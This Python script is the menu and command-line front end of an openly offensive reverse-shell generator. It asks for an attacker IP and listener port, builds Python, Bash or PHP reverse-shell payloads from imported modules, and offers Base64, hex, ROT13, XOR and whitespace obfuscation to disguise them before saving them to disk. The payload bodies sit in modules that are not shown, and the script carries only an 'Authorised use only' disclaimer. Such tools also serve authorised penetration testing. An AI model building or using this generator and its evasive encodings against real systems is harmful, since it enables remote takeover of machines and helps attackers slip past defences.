#!/usr/bin/env python3
"""
Menu-driven Reverse-Shell Generator
Adds optional encoding (Base64, Hex, ROT13, XOR) and obfuscation for Bash, Python, and PHP payloads.
Authorised use only!
"""

import os
import argparse
from payloads import python, bash, php
from encoders.encoder import (
    B64_WRAPPERS, HEX_WRAPPERS, ROT13_WRAPPERS, XOR_WRAPPERS, OBFUSCATOR_WRAPPERS
)

from colorama import init, Fore, Style
init(autoreset=True)

PAYLOAD_MAP = {
    "1": ("python",  python.generate,  "reverse_shell.py"),
    "2": ("bash",    bash.generate,    "reverse_shell.sh"),
    "3": ("php",     php.generate,     "reverse_shell.php"),
}

def print_banner():
    print(Fore.RED + Style.BRIGHT + "\n╔" + "═"*64 + "╗")
    # Block ASCII Art (centered by default)
    ascii_art = [
        "██████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗    ██╗██╗  ██╗",
        "██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██║    ██║╚██╗██╔╝",
        "██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝██║ █╗ ██║ ╚███╔╝ ",
        "██╔═══╝ ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║███╗██║ ██╔██╗ ",
        "██║     ███████╗ ╚████╔╝ ███████╗██║  ██║╚███╔███╔╝██╔╝ ██╗",
        "╚═╝     ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝"
    ]
    for line in ascii_art:
        print(Fore.RED + Style.BRIGHT + "║{:^64s}║".format(line))
    print(Fore.RED + Style.BRIGHT + "╠" + "═"*64 + "╣")
    print(Fore.WHITE + Style.BRIGHT + "║{:^64s}║".format("Reverse-shell Generator"))
    print(Fore.WHITE + "║{:^64s}║".format("Author: Praveen Magar"))
    print(Fore.RED + Style.BRIGHT + "╚" + "═"*64 + "╝" + Style.RESET_ALL)


def save_payload(code: str, filename: str) -> None:
    os.makedirs("output", exist_ok=True)
    with open(f"output/{filename}", "w") as f:
        f.write(code)
    print(Fore.GREEN + f"[+] Payload saved as output/{filename}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="Reverse-shell generator with encoding and obfuscation options."
    )
    parser.add_argument("--ip", help="Attacker IP (LHOST)")
    parser.add_argument("--port", help="Listener port (LPORT)")
    parser.add_argument("--payload", choices=["python", "bash", "php"], help="Payload type")
    parser.add_argument("--encoder", choices=["none", "base64", "hex", "rot13", "xor", "obf"], help="Encoding/Obfuscator type")
    parser.add_argument("--output", help="Output filename")
    args = parser.parse_args()

    # Interactive fallback if args not supplied
    ip = args.ip or input(Fore.YELLOW + "Enter attacker IP (LHOST): " + Style.RESET_ALL).strip()
    port = args.port or input(Fore.YELLOW + "Enter listener port (LPORT): " + Style.RESET_ALL).strip()

    if args.payload:
        payload_choice = {"python":"1","bash":"2","php":"3"}[args.payload]
    else:
        print(Fore.CYAN + "\nSelect payload type:")
        print(Fore.CYAN + " 1. Python")
        print(Fore.CYAN + " 2. Bash")
        print(Fore.CYAN + " 3. PHP")
        payload_choice = input(Fore.YELLOW + "Enter choice (1/2/3): " + Style.RESET_ALL).strip()

    if payload_choice not in PAYLOAD_MAP:
        print(Fore.RED + "[-] Invalid choice!")
        return

    lang, gen_fn, default_name = PAYLOAD_MAP[payload_choice]
    raw_code = gen_fn(ip, port)

    # Encoder logic
    encoder_map = {
        "none": ("", lambda code: code),
        "base64": (".b64", lambda code: B64_WRAPPERS[lang](code)),
        "hex": (".hex", lambda code: HEX_WRAPPERS["python"](code) if lang=="python" else code),
        "rot13": (".rot13", lambda code: ROT13_WRAPPERS["python"](code) if lang=="python" else code),
        "xor": (".xor", lambda code: XOR_WRAPPERS["python"](code) if lang=="python" else code),
        "obf": (".obf", lambda code: OBFUSCATOR_WRAPPERS["python"](code) if lang=="python" else code)
    }

    if args.encoder:
        enc = args.encoder
        if enc not in encoder_map:
            print(Fore.RED + "[-] Encoder not supported.")
            return
        enc_ext, encoder_fn = encoder_map[enc]
        if lang != "python" and enc not in ["none", "base64"]:
            print(Fore.RED + f"[-] {enc} encoding only supported for Python.")
            return
        final_code = encoder_fn(raw_code)
    else:
        # Interactive encoder selection
        print(Fore.CYAN + "\nSelect encoder or obfuscator:")
        print(Fore.CYAN + " 1. None")
        print(Fore.CYAN + " 2. Base64")
        if lang == "python":
            print(Fore.CYAN + " 3. Hex")
            print(Fore.CYAN + " 4. ROT13")
            print(Fore.CYAN + " 5. XOR (key=23)")
            print(Fore.CYAN + " 6. Obfuscate with whitespace/comments")
        encoder_choice = input(Fore.YELLOW + "Enter choice: " + Style.RESET_ALL).strip()

        if encoder_choice == "1":
            final_code = raw_code
            enc_ext = ""
        elif encoder_choice == "2":
            final_code = B64_WRAPPERS[lang](raw_code)
            enc_ext = ".b64"
        elif encoder_choice == "3" and lang == "python":
            final_code = HEX_WRAPPERS["python"](raw_code)
            enc_ext = ".hex"
        elif encoder_choice == "4" and lang == "python":
            final_code = ROT13_WRAPPERS["python"](raw_code)
            enc_ext = ".rot13"
        elif encoder_choice == "5" and lang == "python":
            final_code = XOR_WRAPPERS["python"](raw_code)
            enc_ext = ".xor"
        elif encoder_choice == "6" and lang == "python":
            final_code = OBFUSCATOR_WRAPPERS["python"](raw_code)
            enc_ext = ".obf"
        else:
            print(Fore.RED + "[-] Encoder not supported for this payload type.")
            return

    # Output filename
    fname = args.output or input(Fore.YELLOW + f"Save as (default: {default_name}{enc_ext}): " + Style.RESET_ALL).strip() or (default_name + enc_ext)
    save_payload(final_code, fname)

    # Print a summary
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== PAYLOAD SUMMARY ===" + Style.RESET_ALL)
    print(Fore.CYAN + f"Type      : {lang}")
    print(Fore.CYAN + f"Encoder   : {args.encoder if args.encoder else 'interactive'}")
    print(Fore.CYAN + f"LHOST     : {ip}")
    print(Fore.CYAN + f"LPORT     : {port}")
    print(Fore.CYAN + f"File      : {fname}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user.")
